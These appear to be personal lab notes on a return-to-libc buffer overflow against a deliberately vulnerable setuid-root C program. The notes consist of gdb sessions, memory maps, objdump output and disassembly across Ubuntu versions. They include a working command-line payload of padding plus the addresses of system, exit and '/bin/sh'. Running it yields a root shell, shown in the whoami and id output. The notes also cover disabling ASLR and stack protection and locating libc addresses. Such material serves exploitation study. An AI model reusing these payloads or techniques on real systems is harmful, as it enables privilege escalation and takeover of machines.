b7e7c000-b7e7d000 rw-p 00000000 00:00 0 
b7e7d000-b7fd4000 r-xp 00000000 08:01 18618      /lib/libc-2.12.1.so
b7fd4000-b7fd6000 r--p 00157000 08:01 18618      /lib/libc-2.12.1.so
b7fd6000-b7fd7000 rw-p 00159000 08:01 18618      /lib/libc-2.12.1.so
b7fd7000-b7fda000 rw-p 00000000 00:00 0 
b7fdf000-b7fe1000 rw-p 00000000 00:00 0 
b7fe1000-b7fe2000 r-xp 00000000 00:00 0          [vdso]
b7fe2000-b7ffe000 r-xp 00000000 08:01 18602      /lib/ld-2.12.1.so
b7ffe000-b7fff000 r--p 0001b000 08:01 18602      /lib/ld-2.12.1.so
b7fff000-b8000000 rw-p 0001c000 08:01 18602      /lib/ld-2.12.1.so
bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]
(gdb) 

can be done on peda vmmap

135cda

b7e7d000


x/s 0xb7e97000+0x11f3bf

x/s 0xb7e7d000+

(gdb) x/s 0xb7e7d000+0x135cda
0xb7fb2cda:  "/bin/sh"
(gdb) 


./buf `python -c "print 'A'*112 + '\xb0\xff\xec\xb7'+'\xc0\x60\xec\xb7' + '\xbf\x63\xfb\xb7'"`

payload = 112 bytes of junk + system + return address for system + address of "/bin/sh"


(gdb) p system
$1 = {<text variable, no debug info>} 0xb7eb6680 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7eac6e0 <exit>
(gdb) 

./buf `python -c "print 'A'*112 + '\x80\x66\xeb\xb7'+'\xe0\xc6\xea\xb7' + '\xda\x2c\xfb\xb7'"`

alias python=python

ubuntu@ubuntu:~$ ./buf `python -c "print 'A'*112 + '\x80\x66\xeb\xb7'+'\xe0\xc6\xea\xb7' + '\xda\x2c\xfb\xb7'"`
Input was: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?f?????,??
# 
# whoami
root
# id
uid=1000(ubuntu) gid=1000(ubuntu) euid=0(root) groups=0(root),4(adm),20(dialout),24(cdrom),46(plugdev),109(lpadmin),110(sambashare),111(admin),1000(ubuntu)
# 


`python -c "print 'A'*112 + 'B'*4+'C*4' + 'D'*4"`

set disassembly-flavor intel

(gdb) b *main+28
Breakpoint 1 at 0x8048410
(gdb) r `python -c "print 'A'*112 + 'B'*4+'C*4' + 'D'*4"`
Starting program: /home/ubuntu/buf `python -c "print 'A'*112 + 'B'*4 + 'C4'*4 + 'D'*4"`

Breakpoint 1, 0x08048410 in main ()
(gdb) 

(gdb) x/32xw $sp
0xbffff670: 0xbffff68c  0xbffff8d5  0xb7fffa74  0x00000000
0xbffff680: 0xb7fe0b28  0x00000001  0x00000000  0x00000001
0xbffff690: 0xb7fff918  0x00000000  0x00000000  0xb7fd5ff4
0xbffff6a0: 0xb7f85e49  0xb7eac785  0xbffff6b8  0xb7e93ae5
0xbffff6b0: 0x00000000  0x08049ff4  0xbffff6c8  0x080482e0
0xbffff6c0: 0xb7ff0b80  0x08049ff4  0xbffff6f8  0x08048469
0xbffff6d0: 0xb7fd6324  0xb7fd5ff4  0x08048450  0xbffff6f8
0xbffff6e0: 0xb7eac985  0xb7ff0b80  0x0804845b  0xb7fd5ff4
(gdb) 


(gdb) x/s 0xbffff68c
0xbffff68c:  "\001"
(gdb) x/s 0xbffff8d5
0xbffff8d5:  'A' <repeats 112 times>, "BBBBC*4DDDD"
(gdb) x/s 0xb7fffa74
0xb7fffa74:  "\370\n\376\267\003"
(gdb) 

End of assembler dump.
(gdb) b *main+60
Breakpoint 2 at 0x8048430
(gdb) c
Continuing.
Input was: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBC*4DDDD

Breakpoint 2, 0x08048430 in main ()
(gdb) 

Breakpoint 2, 0x08048430 in main ()
(gdb) x/32xw $sp
0xbffff6fc: 0x42424242  0x44342a43  0x00444444  0xbffff7b0
0xbffff70c: 0xb7fe0848  0xbffff800  0xffffffff  0xb7ffeff4
0xbffff71c: 0x08048243  0x00000001  0xbffff760  0xb7ff0156
0xbffff72c: 0xb7fffad0  0xb7fe0b28  0xb7fd5ff4  0x00000000
0xbffff73c: 0x00000000  0xbffff778  0x5516df07  0x78818717
0xbffff74c: 0x00000000  0x00000000  0x00000000  0x00000002
0xbffff75c: 0x08048340  0x00000000  0xb7ff5db0  0xb7e93c0b
0xbffff76c: 0xb7ffeff4  0x00000002  0x08048340  0x00000000
(gdb) x/s 0x42424242

r `python -c "print 'A'*112 + 'B'*4 + 'C4'*4 + 'D'*4"`

(gdb) r `python -c "print 'A'*112 + 'B'*4 + 'C4'*4 + 'D'*4"`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/ubuntu/buf `python -c "print 'A'*112 + 'B'*4 + 'C4'*4 + 'D'*4"`
Input was: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBC4C4C4C4DDDD

Breakpoint 3, 0x08048430 in main ()
(gdb) x/32xw $sp
0xbffff6ec: 0x42424242  0x34433443  0x34433443  0x44444444
0xbffff6fc: 0xb7fe0800  0xbffff7f0  0xffffffff  0xb7ffeff4
0xbffff70c: 0x08048243  0x00000001  0xbffff750  0xb7ff0156
0xbffff71c: 0xb7fffad0  0xb7fe0b28  0xb7fd5ff4  0x00000000
0xbffff72c: 0x00000000  0xbffff768  0x1439b0d0  0x39ad08c0
0xbffff73c: 0x00000000  0x00000000  0x00000000  0x00000002
0xbffff74c: 0x08048340  0x00000000  0xb7ff5db0  0xb7e93c0b
0xbffff75c: 0xb7ffeff4  0x00000002  0x08048340  0x00000000
(gdb) 

(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()


r `python -c "print 'A'*112 + 'B'*4 + 'C4'*4 + 'D'*4 + 'E'*100"`


(gdb) r `python -c "print 'A'*112 + 'B'*4 + 'C4'*4 + 'D'*4 + 'E'*100"`
Starting program: /home/ubuntu/buf `python -c "print 'A'*112 + 'B'*4 + 'C4'*4 + 'D'*4 + 'E'*100"`
Input was: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBC4C4C4C4DDDDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE

Breakpoint 3, 0x08048430 in main ()
(gdb) x/32xw $sp
0xbffff68c: 0x42424242  0x34433443  0x34433443  0x44444444
0xbffff69c: 0x45454545  0x45454545  0x45454545  0x45454545
0xbffff6ac: 0x45454545  0x45454545  0x45454545  0x45454545
0xbffff6bc: 0x45454545  0x45454545  0x45454545  0x45454545
0xbffff6cc: 0x45454545  0x45454545  0x45454545  0x45454545
0xbffff6dc: 0x45454545  0x45454545  0x45454545  0x45454545
0xbffff6ec: 0x45454545  0x45454545  0x45454545  0x45454545
0xbffff6fc: 0x45454545  0x00000000  0x08048340  0x00000000
(gdb) 


```

### Using Ubuntu 18.04.02

```

alsr off 

$ cat /proc/sys/kernel/randomize_va_space
0

gcc buf.c -o buf -fno-stack-protector
sudo chown root buf
sudo chmod +s buf


ubuntu@ubuntu:~/return2libc$ objdump -p buf

buf:     file format elf64-x86-64

Program Header:
    PHDR off    0x0000000000000040 vaddr 0x0000000000000040 paddr 0x0000000000000040 align 2**3
         filesz 0x00000000000001f8 memsz 0x00000000000001f8 flags r--
  INTERP off    0x0000000000000238 vaddr 0x0000000000000238 paddr 0x0000000000000238 align 2**0
         filesz 0x000000000000001c memsz 0x000000000000001c flags r--
    LOAD off    0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**21
         filesz 0x00000000000008b8 memsz 0x00000000000008b8 flags r-x
    LOAD off    0x0000000000000db0 vaddr 0x0000000000200db0 paddr 0x0000000000200db0 align 2**21
         filesz 0x0000000000000260 memsz 0x0000000000000268 flags rw-
 DYNAMIC off    0x0000000000000dc0 vaddr 0x0000000000200dc0 paddr 0x0000000000200dc0 align 2**3
         filesz 0x00000000000001f0 memsz 0x00000000000001f0 flags rw-
    NOTE off    0x0000000000000254 vaddr 0x0000000000000254 paddr 0x0000000000000254 align 2**2
         filesz 0x0000000000000044 memsz 0x0000000000000044 flags r--
EH_FRAME off    0x0000000000000774 vaddr 0x0000000000000774 paddr 0x0000000000000774 align 2**2
         filesz 0x000000000000003c memsz 0x000000000000003c flags r--
   STACK off    0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**4
         filesz 0x0000000000000000 memsz 0x0000000000000000 flags rw-  <===========================Only read and write permissions for stack
   RELRO off    0x0000000000000db0 vaddr 0x0000000000200db0 paddr 0x0000000000200db0 align 2**0
         filesz 0x0000000000000250 memsz 0x0000000000000250 flags r--

Dynamic Section:
  NEEDED               libc.so.6
  INIT                 0x0000000000000528
  FINI                 0x0000000000000754
  INIT_ARRAY           0x0000000000200db0
  INIT_ARRAYSZ         0x0000000000000008
  FINI_ARRAY           0x0000000000200db8
  FINI_ARRAYSZ         0x0000000000000008
  GNU_HASH             0x0000000000000298
  STRTAB               0x0000000000000378
  SYMTAB               0x00000000000002b8
  STRSZ                0x000000000000008b
  SYMENT               0x0000000000000018
  DEBUG                0x0000000000000000
  PLTGOT               0x0000000000200fb0
  PLTRELSZ             0x0000000000000030
  PLTREL               0x0000000000000007
  JMPREL               0x00000000000004f8
  RELA                 0x0000000000000438
  RELASZ               0x00000000000000c0
  RELAENT              0x0000000000000018
  FLAGS                0x0000000000000008
  FLAGS_1              0x0000000008000001
  VERNEED              0x0000000000000418
  VERNEEDNUM           0x0000000000000001
  VERSYM               0x0000000000000404
  RELACOUNT            0x0000000000000003

Version References:
  required from libc.so.6:
    0x09691a75 0x00 02 GLIBC_2.2.5


from old buf file. stack is executable 

ubuntu@ubuntu:~/return2libc$ objdump -p ../smash/buf

../smash/buf:     file format elf64-x86-64

Program Header:
    PHDR off    0x0000000000000040 vaddr 0x0000000000400040 paddr 0x0000000000400040 align 2**3
         filesz 0x00000000000001f8 memsz 0x00000000000001f8 flags r--
  INTERP off    0x0000000000000238 vaddr 0x0000000000400238 paddr 0x0000000000400238 align 2**0
         filesz 0x000000000000001c memsz 0x000000000000001c flags r--
    LOAD off    0x0000000000000000 vaddr 0x0000000000400000 paddr 0x0000000000400000 align 2**21
         filesz 0x0000000000000750 memsz 0x0000000000000750 flags r-x
    LOAD off    0x0000000000000e10 vaddr 0x0000000000600e10 paddr 0x0000000000600e10 align 2**21
         filesz 0x0000000000000228 memsz 0x0000000000000230 flags rw-
 DYNAMIC off    0x0000000000000e20 vaddr 0x0000000000600e20 paddr 0x0000000000600e20 align 2**3
         filesz 0x00000000000001d0 memsz 0x00000000000001d0 flags rw-
    NOTE off    0x0000000000000254 vaddr 0x0000000000400254 paddr 0x0000000000400254 align 2**2
         filesz 0x0000000000000044 memsz 0x0000000000000044 flags r--
EH_FRAME off    0x0000000000000614 vaddr 0x0000000000400614 paddr 0x0000000000400614 align 2**2
         filesz 0x000000000000003c memsz 0x000000000000003c flags r--
   STACK off    0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**4
         filesz 0x0000000000000000 memsz 0x0000000000000000 flags rwx   <=============================== stack rwx executable
   RELRO off    0x0000000000000e10 vaddr 0x0000000000600e10 paddr 0x0000000000600e10 align 2**0
         filesz 0x00000000000001f0 memsz 0x00000000000001f0 flags r--

Dynamic Section:
  NEEDED               libc.so.6
  INIT                 0x0000000000400400
  FINI                 0x00000000004005f4
  INIT_ARRAY           0x0000000000600e10
  INIT_ARRAYSZ         0x0000000000000008
  FINI_ARRAY           0x0000000000600e18
  FINI_ARRAYSZ         0x0000000000000008
  GNU_HASH             0x0000000000400298
  STRTAB               0x0000000000400330
  SYMTAB               0x00000000004002b8
  STRSZ                0x0000000000000046
  SYMENT               0x0000000000000018
  DEBUG                0x0000000000000000
  PLTGOT               0x0000000000601000
  PLTRELSZ             0x0000000000000030
  PLTREL               0x0000000000000007
  JMPREL               0x00000000004003d0
  RELA                 0x00000000004003a0
  RELASZ               0x0000000000000030
  RELAENT              0x0000000000000018
  VERNEED              0x0000000000400380
  VERNEEDNUM           0x0000000000000001
  VERSYM               0x0000000000400376

Version References:
  required from libc.so.6:
    0x09691a75 0x00 02 GLIBC_2.2.5


gdb-peda$ disas main
Dump of assembler code for function main:
   0x000000000000068a <+0>:   push   rbp
   0x000000000000068b <+1>:   mov    rbp,rsp
   0x000000000000068e <+4>:   add    rsp,0xffffffffffffff80
   0x0000000000000692 <+8>:   mov    DWORD PTR [rbp-0x74],edi
   0x0000000000000695 <+11>:  mov    QWORD PTR [rbp-0x80],rsi
   0x0000000000000699 <+15>:  mov    rax,QWORD PTR [rbp-0x80]
   0x000000000000069d <+19>:  add    rax,0x8
   0x00000000000006a1 <+23>:  mov    rdx,QWORD PTR [rax]
   0x00000000000006a4 <+26>:  lea    rax,[rbp-0x70]
   0x00000000000006a8 <+30>:  mov    rsi,rdx
   0x00000000000006ab <+33>:  mov    rdi,rax
   0x00000000000006ae <+36>:  call   0x550 <strcpy@plt>
   0x00000000000006b3 <+41>:  lea    rax,[rbp-0x70]
   0x00000000000006b7 <+45>:  mov    rsi,rax
   0x00000000000006ba <+48>:  lea    rdi,[rip+0xa3]        # 0x764
   0x00000000000006c1 <+55>:  mov    eax,0x0
   0x00000000000006c6 <+60>:  call   0x560 <printf@plt>
   0x00000000000006cb <+65>:  mov    eax,0x0
   0x00000000000006d0 <+70>:  leave  
   0x00000000000006d1 <+71>:  ret    
End of assembler dump.
gdb-peda$ 


ubuntu@ubuntu:~/return2libc$ gcc buf.c -o buf -m32 -fno-stack-protector
In file included from buf.c:1:0:
/usr/include/stdio.h:27:10: fatal error: bits/libc-header-start.h: No such file or directory
 #include <bits/libc-header-start.h>
          ^~~~~~~~~~~~~~~~~~~~~~~~~~
compilation terminated.

sudo apt-get install gcc-multilib g++-multilib

gcc buf.c -o buf -m32 -fno-stack-protector

ubuntu@ubuntu:~/return2libc$ objdump -p buf

buf:     file format elf32-i386

Program Header:
    PHDR off    0x00000034 vaddr 0x00000034 paddr 0x00000034 align 2**2
         filesz 0x00000120 memsz 0x00000120 flags r--
  INTERP off    0x00000154 vaddr 0x00000154 paddr 0x00000154 align 2**0
         filesz 0x00000013 memsz 0x00000013 flags r--
    LOAD off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**12
         filesz 0x0000075c memsz 0x0000075c flags r-x
    LOAD off    0x00000ed4 vaddr 0x00001ed4 paddr 0x00001ed4 align 2**12
         filesz 0x00000134 memsz 0x00000138 flags rw-
 DYNAMIC off    0x00000edc vaddr 0x00001edc paddr 0x00001edc align 2**2
         filesz 0x000000f8 memsz 0x000000f8 flags rw-
    NOTE off    0x00000168 vaddr 0x00000168 paddr 0x00000168 align 2**2
         filesz 0x00000044 memsz 0x00000044 flags r--
EH_FRAME off    0x00000640 vaddr 0x00000640 paddr 0x00000640 align 2**2
         filesz 0x00000034 memsz 0x00000034 flags r--
   STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**4
         filesz 0x00000000 memsz 0x00000000 flags rw- <=========================== stack is not executable
   RELRO off    0x00000ed4 vaddr 0x00001ed4 paddr 0x00001ed4 align 2**0
         filesz 0x0000012c memsz 0x0000012c flags r--

Dynamic Section:
  NEEDED               libc.so.6
  INIT                 0x0000039c
  FINI                 0x00000614
  INIT_ARRAY           0x00001ed4
  INIT_ARRAYSZ         0x00000004
  FINI_ARRAY           0x00001ed8
  FINI_ARRAYSZ         0x00000004
  GNU_HASH             0x000001ac
  STRTAB               0x0000025c
  SYMTAB               0x000001cc
  STRSZ                0x000000a4
  SYMENT               0x00000010
  DEBUG                0x00000000
  PLTGOT               0x00001fd4
  PLTRELSZ             0x00000018
  PLTREL               0x00000011
  JMPREL               0x00000384
  REL                  0x00000344
  RELSZ                0x00000040
  RELENT               0x00000008
  FLAGS                0x00000008
  FLAGS_1              0x08000001
  VERNEED              0x00000314
  VERNEEDNUM           0x00000001
  VERSYM               0x00000300
  RELCOUNT             0x00000004

Version References:
  required from libc.so.6:
    0x09691f73 0x00 03 GLIBC_2.1.3
    0x0d696910 0x00 02 GLIBC_2.0

ubuntu@ubuntu:~/return2libc$ 

gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000054d <+0>:  lea    ecx,[esp+0x4]
   0x00000551 <+4>:  and    esp,0xfffffff0
   0x00000554 <+7>:  push   DWORD PTR [ecx-0x4]
   0x00000557 <+10>: push   ebp
   0x00000558 <+11>: mov    ebp,esp
   0x0000055a <+13>: push   ebx
   0x0000055b <+14>: push   ecx
   0x0000055c <+15>: sub    esp,0x70
   0x0000055f <+18>: call   0x450 <__x86.get_pc_thunk.bx>
   0x00000564 <+23>: add    ebx,0x1a70
   0x0000056a <+29>: mov    eax,ecx
   0x0000056c <+31>: mov    eax,DWORD PTR [eax+0x4]
   0x0000056f <+34>: add    eax,0x4
   0x00000572 <+37>: mov    eax,DWORD PTR [eax]
   0x00000574 <+39>: sub    esp,0x8
   0x00000577 <+42>: push   eax
   0x00000578 <+43>: lea    eax,[ebp-0x6c]
   0x0000057b <+46>: push   eax
   0x0000057c <+47>: call   0x3e0 <strcpy@plt>
   0x00000581 <+52>: add    esp,0x10
   0x00000584 <+55>: sub    esp,0x8
   0x00000587 <+58>: lea    eax,[ebp-0x6c]
   0x0000058a <+61>: push   eax
   0x0000058b <+62>: lea    eax,[ebx-0x19a4]
   0x00000591 <+68>: push   eax
   0x00000592 <+69>: call   0x3d0 <printf@plt>
   0x00000597 <+74>: add    esp,0x10
   0x0000059a <+77>: mov    eax,0x0
   0x0000059f <+82>: lea    esp,[ebp-0x8]
   0x000005a2 <+85>: pop    ecx
   0x000005a3 <+86>: pop    ebx
   0x000005a4 <+87>: pop    ebp
   0x000005a5 <+88>: lea    esp,[ecx-0x4]
   0x000005a8 <+91>: ret    
End of assembler dump.

gdb-peda$ p getpid
$1 = {<text variable, no debug info>} 0xf7eabb70 <getpid>
gdb-peda$ 

Breakpoint 1, 0x5655555c in main ()
gdb-peda$ p getpid
$2 = {<text variable, no debug info>} 0xf7eabb70 <getpid>
gdb-peda$ p getpid()
'getpid' has unknown return type; cast the call to its declared return type
gdb-peda$ 

https://sourceware.org/gdb/onlinedocs/gdb/Calling.html

gdb-peda$ p (int) getpid()
$3 = 0x4169
gdb-peda$ 


https://www.rapidtables.com/convert/number/hex-to-decimal.html

0x4169 -> 16745

gdb-peda$ shell cat /proc/16745/maps
56555000-56556000 r-xp 00000000 08:02 558994                             /home/ubuntu/return2libc/buf
56556000-56557000 r--p 00000000 08:02 558994                             /home/ubuntu/return2libc/buf
56557000-56558000 rw-p 00001000 08:02 558994                             /home/ubuntu/return2libc/buf
f7ded000-f7fbf000 r-xp 00000000 08:02 393359                             /lib32/libc-2.27.so
f7fbf000-f7fc0000 ---p 001d2000 08:02 393359                             /lib32/libc-2.27.so
f7fc0000-f7fc2000 r--p 001d2000 08:02 393359                             /lib32/libc-2.27.so
f7fc2000-f7fc3000 rw-p 001d4000 08:02 393359                             /lib32/libc-2.27.so
f7fc3000-f7fc6000 rw-p 00000000 00:00 0 
f7fcf000-f7fd1000 rw-p 00000000 00:00 0 
f7fd1000-f7fd4000 r--p 00000000 00:00 0                                  [vvar]
f7fd4000-f7fd6000 r-xp 00000000 00:00 0                                  [vdso]
f7fd6000-f7ffc000 r-xp 00000000 08:02 393355                             /lib32/ld-2.27.so
f7ffc000-f7ffd000 r--p 00025000 08:02 393355                             /lib32/ld-2.27.so
f7ffd000-f7ffe000 rw-p 00026000 08:02 393355                             /lib32/ld-2.27.so
fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
gdb-peda$ 


running smash buf to compare

Breakpoint 1, 0x000000000040053b in main ()
gdb-peda$ p getpid()
'getpid' has unknown return type; cast the call to its declared return type
gdb-peda$ p (int) getpid()
$1 = 0x417c  ==>16764
gdb-peda$ 

shell cat /proc/16764/maps

gdb-peda$ shell cat /proc/16764/maps
00400000-00401000 r-xp 00000000 08:02 406534                             /home/ubuntu/smash/buf
00600000-00601000 r-xp 00000000 08:02 406534                             /home/ubuntu/smash/buf
00601000-00602000 rwxp 00001000 08:02 406534                             /home/ubuntu/smash/buf
7ffff79e4000-7ffff7bcb000 r-xp 00000000 08:02 131861                     /lib/x86_64-linux-gnu/libc-2.27.so
7ffff7bcb000-7ffff7dcb000 ---p 001e7000 08:02 131861                     /lib/x86_64-linux-gnu/libc-2.27.so
7ffff7dcb000-7ffff7dcf000 r-xp 001e7000 08:02 131861                     /lib/x86_64-linux-gnu/libc-2.27.so
7ffff7dcf000-7ffff7dd1000 rwxp 001eb000 08:02 131861                     /lib/x86_64-linux-gnu/libc-2.27.so
7ffff7dd1000-7ffff7dd5000 rwxp 00000000 00:00 0 
7ffff7dd5000-7ffff7dfc000 r-xp 00000000 08:02 131849                     /lib/x86_64-linux-gnu/ld-2.27.so
7ffff7fec000-7ffff7fee000 rwxp 00000000 00:00 0 
7ffff7ff7000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]
7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
7ffff7ffc000-7ffff7ffd000 r-xp 00027000 08:02 131849                     /lib/x86_64-linux-gnu/ld-2.27.so
7ffff7ffd000-7ffff7ffe000 rwxp 00028000 08:02 131849                     /lib/x86_64-linux-gnu/ld-2.27.so
7ffff7ffe000-7ffff7fff000 rwxp 00000000 00:00 0 
7ffffffde000-7ffffffff000 rwxp 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
gdb-peda$ 

```


### Using ubuntu 16.04.6 

```
download 32 bit ubuntu 16.04.6 
http://mirror.math.princeton.edu/pub/ubuntu-iso/16.04.6/
https://launchpad.net/ubuntu/+cdmirrors?_ga=2.157884799.452104216.1560942024-177706796.1556516477


Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)


#include<stdio.h> 
#include<string.h> 
int main(int argc, char *argv[]) 
{ 
  char buf[100]; 
  strcpy(buf,argv[1]); 
  printf("Input was: %s\n",buf); 
  return 0; 
}


ubuntu@ubuntu:~/return2libc$ cat /proc/sys/kernel/randomize_va_space
0

sudo apt install gcc

ubuntu@ubuntu:~/return2libc$ sudo apt install gcc
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following additional packages will be installed:
  binutils cpp cpp-5 gcc-5 libasan2 libatomic1 libc-dev-bin libc6-dev libcc1-0 libcilkrts5 libgcc-5-dev libgomp1 libisl15 libitm1 libmpc3
  libmpx0 libquadmath0 libubsan0 linux-libc-dev manpages-dev
Suggested packages:
  binutils-doc cpp-doc gcc-5-locales gcc-multilib make autoconf automake libtool flex bison gdb gcc-doc gcc-5-multilib gcc-5-doc libgcc1-dbg
  libgomp1-dbg libitm1-dbg libatomic1-dbg libasan2-dbg liblsan0-dbg libtsan0-dbg libubsan0-dbg libcilkrts5-dbg libmpx0-dbg libquadmath0-dbg
  glibc-doc
The following NEW packages will be installed:
  binutils cpp cpp-5 gcc gcc-5 libasan2 libatomic1 libc-dev-bin libc6-dev libcc1-0 libcilkrts5 libgcc-5-dev libgomp1 libisl15 libitm1 libmpc3
  libmpx0 libquadmath0 libubsan0 linux-libc-dev manpages-dev
0 upgraded, 21 newly installed, 0 to remove and 97 not upgraded.
Need to get 26.8 MB of archives.
After this operation, 94.1 MB of additional disk space will be used.
Do you want to continue? [Y/n] 
Get:1 http://us.archive.ubuntu.com/ubuntu xenial/main i386 libmpc3 i386 1.0.3-1 [44.2 kB]
Get:2 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 binutils i386 2.26.1-1ubuntu1~16.04.8 [2,494 kB]
Get:3 http://us.archive.ubuntu.com/ubuntu xenial/main i386 libisl15 i386 0.16.1-1 [599 kB]
Get:4 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 cpp-5 i386 5.4.0-6ubuntu1~16.04.11 [7,609 kB]
Get:5 http://us.archive.ubuntu.com/ubuntu xenial/main i386 cpp i386 4:5.3.1-1ubuntu1 [27.7 kB]                                                   
Get:6 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libcc1-0 i386 5.4.0-6ubuntu1~16.04.11 [39.3 kB] 

gcc buf.c -o buf -fno-stack-protector

sudo chown root buf
sudo chmod +s buf

ubuntu@ubuntu:~/return2libc$ objdump -p buf

buf:     file format elf32-i386

Program Header:
    PHDR off    0x00000034 vaddr 0x08048034 paddr 0x08048034 align 2**2
         filesz 0x00000120 memsz 0x00000120 flags r-x
  INTERP off    0x00000154 vaddr 0x08048154 paddr 0x08048154 align 2**0
         filesz 0x00000013 memsz 0x00000013 flags r--
    LOAD off    0x00000000 vaddr 0x08048000 paddr 0x08048000 align 2**12
         filesz 0x00000618 memsz 0x00000618 flags r-x
    LOAD off    0x00000f08 vaddr 0x08049f08 paddr 0x08049f08 align 2**12
         filesz 0x00000118 memsz 0x0000011c flags rw-
 DYNAMIC off    0x00000f14 vaddr 0x08049f14 paddr 0x08049f14 align 2**2
         filesz 0x000000e8 memsz 0x000000e8 flags rw-
    NOTE off    0x00000168 vaddr 0x08048168 paddr 0x08048168 align 2**2
         filesz 0x00000044 memsz 0x00000044 flags r--
EH_FRAME off    0x00000520 vaddr 0x08048520 paddr 0x08048520 align 2**2
         filesz 0x0000002c memsz 0x0000002c flags r--
   STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**4
         filesz 0x00000000 memsz 0x00000000 flags rw-  <===================== not executable, just rw
   RELRO off    0x00000f08 vaddr 0x08049f08 paddr 0x08049f08 align 2**0
         filesz 0x000000f8 memsz 0x000000f8 flags r--

Dynamic Section:
  NEEDED               libc.so.6
  INIT                 0x080482cc
  FINI                 0x080484f4
  INIT_ARRAY           0x08049f08
  INIT_ARRAYSZ         0x00000004
  FINI_ARRAY           0x08049f0c
  FINI_ARRAYSZ         0x00000004
  GNU_HASH             0x080481ac
  STRTAB               0x0804822c
  SYMTAB               0x080481cc
  STRSZ                0x00000053
  SYMENT               0x00000010
  DEBUG                0x00000000
  PLTGOT               0x0804a000
  PLTRELSZ             0x00000018
  PLTREL               0x00000011
  JMPREL               0x080482b4
  REL                  0x080482ac
  RELSZ                0x00000008
  RELENT               0x00000008
  VERNEED              0x0804828c
  VERNEEDNUM           0x00000001
  VERSYM               0x08048280

Version References:
  required from libc.so.6:
    0x0d696910 0x00 02 GLIBC_2.0


sudo apt install gdb

ubuntu@ubuntu:~/return2libc$ gdb buf
The program 'gdb' is currently not installed. You can install it by typing:
sudo apt install gdb
ubuntu@ubuntu:~/return2libc$ sudo apt install gdb
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following additional packages will be installed:
  gdbserver libbabeltrace-ctf1 libbabeltrace1 libc6-dbg
Suggested packages:
  gdb-doc
The following NEW packages will be installed:
  gdb gdbserver libbabeltrace-ctf1 libbabeltrace1 libc6-dbg
0 upgraded, 5 newly installed, 0 to remove and 97 not upgraded.
Need to get 6,019 kB of archives.
After this operation, 26.6 MB of additional disk space will be used.
Do you want to continue? [Y/n] 

(gdb) disas main
Dump of assembler code for function main:
   0x0804843b <+0>:  lea    0x4(%esp),%ecx
   0x0804843f <+4>:  and    $0xfffffff0,%esp
   0x08048442 <+7>:  pushl  -0x4(%ecx)
   0x08048445 <+10>: push   %ebp
   0x08048446 <+11>: mov    %esp,%ebp
   0x08048448 <+13>: push   %ecx
   0x08048449 <+14>: sub    $0x74,%esp
   0x0804844c <+17>: mov    %ecx,%eax
   0x0804844e <+19>: mov    0x4(%eax),%eax
   0x08048451 <+22>: add    $0x4,%eax
   0x08048454 <+25>: mov    (%eax),%eax
   0x08048456 <+27>: sub    $0x8,%esp
   0x08048459 <+30>: push   %eax
   0x0804845a <+31>: lea    -0x6c(%ebp),%eax
   0x0804845d <+34>: push   %eax
   0x0804845e <+35>: call   0x8048310 <strcpy@plt>
   0x08048463 <+40>: add    $0x10,%esp
   0x08048466 <+43>: sub    $0x8,%esp
   0x08048469 <+46>: lea    -0x6c(%ebp),%eax
   0x0804846c <+49>: push   %eax
   0x0804846d <+50>: push   $0x8048510
   0x08048472 <+55>: call   0x8048300 <printf@plt>
   0x08048477 <+60>: add    $0x10,%esp
   0x0804847a <+63>: mov    $0x0,%eax
   0x0804847f <+68>: mov    -0x4(%ebp),%ecx
   0x08048482 <+71>: leave  
   0x08048483 <+72>: lea    -0x4(%ecx),%esp
   0x08048486 <+75>: ret    
End of assembler dump.
(gdb) 


(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x0804843b <+0>:  lea    ecx,[esp+0x4]
   0x0804843f <+4>:  and    esp,0xfffffff0
   0x08048442 <+7>:  push   DWORD PTR [ecx-0x4]
   0x08048445 <+10>: push   ebp
   0x08048446 <+11>: mov    ebp,esp
   0x08048448 <+13>: push   ecx
   0x08048449 <+14>: sub    esp,0x74
   0x0804844c <+17>: mov    eax,ecx
   0x0804844e <+19>: mov    eax,DWORD PTR [eax+0x4]
   0x08048451 <+22>: add    eax,0x4
